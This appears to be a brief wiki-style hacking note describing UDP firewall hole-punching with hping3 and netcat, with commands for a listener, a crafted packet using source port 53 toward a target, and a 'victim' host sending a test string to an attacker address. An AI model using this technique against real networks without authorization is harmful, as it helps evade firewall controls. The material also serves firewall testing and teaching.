# Bypass Firewall

Using  [[Hping3|hping3]] to bypass the firewall. and `netcat` tools under Linux. Firstly start a UDP listener and in this example the port will be 14141.

```
userware@hackware-os:~$ nc -ulp 14141
```

An external computer (`remote`) then attempts to contact it.

```
victim@remote:~$ echo "hello" | nc -p 53 -u <attacker_IP> 14141
```

However, as expected nothing is received on attacker's machine and, thanks to the firewall, nothing is returned to remote. Now to bypass it. We'll use `hping3` to generate IP packets to punch a hole in the firewall.

```
root@hackware-os:~# hping3 -c 1 -2 -s 14141 -p 53 <target_IP>
```

As long as remote is behaving itself, it will send back a `port unreachable` response via ICMP - however this is of no consequence. On the second attempt. The `netcat` listener then coughs up a `hello` - the UDP packet from outside has passed through the firewall and arrived at the computer behind it.

```
victim@remote:~$ echo "hello" | nc -p 53 -u <attacker_IP> 14141
```
